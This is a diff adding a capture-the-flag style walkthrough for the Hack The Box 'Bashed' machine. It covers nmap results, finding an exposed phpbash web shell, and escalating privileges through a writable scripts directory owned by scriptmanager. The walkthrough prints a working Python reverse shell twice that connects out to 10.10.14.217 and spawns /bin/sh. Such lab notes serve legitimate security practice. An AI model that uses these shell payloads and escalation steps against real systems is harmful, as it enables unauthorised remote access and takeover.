@@ -129,7 +129,38 @@ echo "username:password" | chpasswd
 su - dcom
 
 
+14. Bashed (10.10.10.68)
+
+Nmap Scan : 
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Aggressive OS guesses: Linux 3.16 (95%), Linux 3.2 - 4.8 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.12 (94%), Linux 3.13 (94%), Linux 3.18 (94%), Linux 3.8 - 3.11 (94%), Linux 3.1 (93%), Linux 3.2 (93%)
+No exact OS matches for host (test conditions non-ideal).
+
+Hack : 
+- use dirb with common.txt list, we can directly access the php bash shell using below url
+http://10.10.10.68/dev/phpbash.min.php
 
 
+Priv-Escalation : 
 
+- "sudo -l" to check what "www-data" user can execute. 
+- Found "/scripts" directory with ownership of "scriptmanager" user which has exeution right.
+- To enter /scripts directory : sudo -u scriptmanager chmod 777 /scripts ### command run with scriptmanager user privilage
+- execute python reverse shell as below 
+
+Method 1 : One liner for command line 
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.217",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh" ,"-i"]);'
+
+Method 2 : Write reverse shell python program in a file with ownership of scriptmanager using command echo. ## Script manager ownership is important
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.217",1234))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+
+- This will give the root prompt. ### Need to open listening port ###
 
